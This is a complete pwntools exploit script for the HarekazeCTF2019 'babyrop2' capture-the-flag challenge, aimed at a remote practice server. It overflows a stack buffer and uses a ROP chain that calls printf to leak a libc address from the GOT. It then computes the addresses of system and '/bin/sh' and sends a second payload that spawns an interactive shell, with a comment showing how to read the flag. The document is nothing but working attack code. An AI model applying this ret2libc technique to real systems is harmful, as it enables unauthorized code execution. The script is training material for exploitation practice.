from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27378)
elf = ELF('./HarekazeCTF2019_babyrop2')
main = elf.sym['main']
printf_plt = elf.plt['printf']
read_got = elf.got['read']
rdi_ret = 0x400733 # pop rdi ; ret
pop_rsi = 0x400731 # pop rsi ; pop r15 ; ret
format_str = 0x400770
offset = 0x20 + 0x8
payload = b'a'*offset + flat(rdi_ret, format_str, pop_rsi, read_got, 0, printf_plt, main)
io.sendlineafter(b"What's your name? ", payload)
read_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.info('read_address => %s', hex(read_addr))
libc = ELF('./libc.so.6')
libcbase = read_addr-libc.sym['read']
log.info('libc_address => %s', hex(libcbase))
system = libcbase + libc.sym['system']
log.info('system_address => %s', hex(system))
bin_sh = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh))
payload = b'a'*offset + p64(rdi_ret) + p64(bin_sh) + p64(system)
io.sendlineafter(b"What's your name? ", payload)
io.interactive() # cat /home/babyrop2/flag